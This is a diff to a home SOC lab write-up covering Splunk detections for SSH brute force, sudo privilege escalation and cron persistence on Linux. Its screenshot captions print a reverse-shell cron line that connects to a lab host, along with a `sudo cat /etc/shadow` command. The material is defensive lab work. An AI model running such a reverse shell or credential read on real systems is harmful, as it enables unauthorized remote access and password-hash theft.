@@ -5,15 +5,11 @@
 **Duration:** ~3 hours  
 **Confidence After:** 4-5/10 — New log ecosystem, lots of surface area
 
----
-
 ## Overview
 
 Week 4 expands detection to **Linux endpoints** using syslog and auditd. We establish baselines for Linux authentication logs, detect SSH brute force using Hydra, privilege escalation via sudo, and cron-based persistence.
 
 **Key Outcome:** Detect T1110.001 (SSH brute force), T1548.003 (sudo privilege escalation), T1053.003 (cron persistence), with full command execution visibility.
-
----
 
 ## Linux Log Sources
 
@@ -25,8 +21,6 @@ Week 4 expands detection to **Linux endpoints** using syslog and auditd. We esta
 | ~/.bash_history | bash_history | Command history (passive investigation) | ✅ |
 
 **Splunk Add-on:** Splunk Add-on for Unix and Linux (parses user, src automatically but drops command arguments from sudo lines)
-
----
 
 ## Tasks Completed
 
@@ -69,10 +63,16 @@ index=linux sourcetype=linux_secure "Failed password"
 
 **Result:** ✅ Detected brute force attempt; identified attacker IP and target user
 
-**Screenshot Placeholders:**
-- [ ] Screenshot: Hydra brute force command running on Kali
-- [ ] Screenshot: Splunk showing 306 failed password events from single source
-- [ ] Screenshot: Detection query filtering to 5-minute windows
+**SSH Brute Force Detection:**
+
+![Hydra SSH Brute Force Attack](./screenshots/week4-01-hydra-brute-force.png)
+*Hydra command running from Kali (10.10.40.1) against Parrot SSH server (10.10.40.2) with 306 attempted logins*
+
+![Failed Login Events - Splunk Detection](./screenshots/week4-02-ssh-failed-logins.png)
+*Splunk showing 306 failed password events from single source IP with target user identified*
+
+![Detection Query Results](./screenshots/week4-03-ssh-detection-query.png)
+*Splunk detection query results: 5-minute buckets with count >= 5 failures triggering alert*
 
 ### Task 3: Detect Sudo Privilege Escalation (T1548.003)
 
@@ -98,9 +98,13 @@ index=linux sourcetype=linux_secure
 
 **Key Finding:** Access to /etc/shadow as non-root = privilege escalation indicator
 
-**Screenshot Placeholders:**
-- [ ] Screenshot: SSH session showing sudo cat /etc/shadow
-- [ ] Screenshot: Splunk showing full sudo command with as_user=root and command="/etc/shadow"
+**Sudo Escalation Detection:**
+
+![SSH Terminal - Sudo Shadow Command](./screenshots/week4-04-sudo-shadow-command.png)
+*SSH session showing netcur10s user running `sudo cat /etc/shadow` to access root-owned password hashes*
+
+![Splunk Sudo Command with Full Context](./screenshots/week4-05-splunk-sudo-extracted.png)
+*Splunk showing extracted sudo session: sudo_user=netcur10s, as_user=root, COMMAND="cat /etc/shadow" - clear privilege escalation*
 
 ### Task 4: Detect Cron Persistence (T1053.003)
 
@@ -125,15 +129,13 @@ index=linux sourcetype=syslog "CRON"
 
 **Result:** ✅ Detected reverse shell cron job (every minute, visible in syslog)
 
-**Cleanup:**
-```bash
-crontab -r  # Remove all cron jobs
-crontab -l  # Verify removed
-```
+**Cron Persistence Detection:**
 
-**Screenshot Placeholders:**
-- [ ] Screenshot: Cron job added with echo command
-- [ ] Screenshot: Splunk showing CRON CMD entries every minute with bash command
+![Cron Job Added - Reverse Shell](./screenshots/week4-06-cron-reverse-shell.png)
+*Terminal showing cron job added for netcur10s user: `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.40.1/4444 0>&1'` executing reverse shell every minute*
+
+![Splunk Cron Detection - CRON CMD Entries](./screenshots/week4-07-splunk-cron-detection.png)
+*Splunk syslog showing repeated CRON CMD entries every minute with bash command visible - clear persistence mechanism*
 
 ### Task 5: Auditd Event Analysis
 
@@ -178,8 +180,6 @@ sudo apt --fix-broken install -y
 
 **Lesson:** Sometimes brute-force removal is necessary; use force flags only when confident.
 
----
-
 ## Key Learnings
 
 - **Linux TA has limitations:** Automatic parsing of user/src works, but COMMAND arguments dropped; must use rex for full visibility
@@ -187,8 +187,6 @@ sudo apt --fix-broken install -y
 - **Cron jobs are easily visible:** Logs appear in syslog automatically; no special configuration needed
 - **Regex patterns take iteration:** Built patterns by reading raw logs first, identifying context, then writing rex capture groups
 - **SSH brute force detection is reliable:** Failed password events are consistent and easy to threshold
-
----
 
 ## Splunk Queries Built
 
@@ -199,8 +197,10 @@ sudo apt --fix-broken install -y
 | Cron Persistence | Detects command at regular intervals | Very High |
 | Failed Auth Anomalies | Auditd LOGIN events | Medium |
 
----
-
 **Week 4 Status:** ✅ COMPLETE  
-**Confidence:** 4-5/10 (new ecosystem, comfortable with core techniques)  
-**Next Session:** June 7, 2026 (Week 5)
+**Confidence:** 4-5/10 (new ecosystem, comfortable with core techniques)
+
+## Navigation
+
+← [Back to Main SOC Lab Overview](../README.md)  
+[Week 5: Network Detection →](../Week5-Network-Detection/README.md)
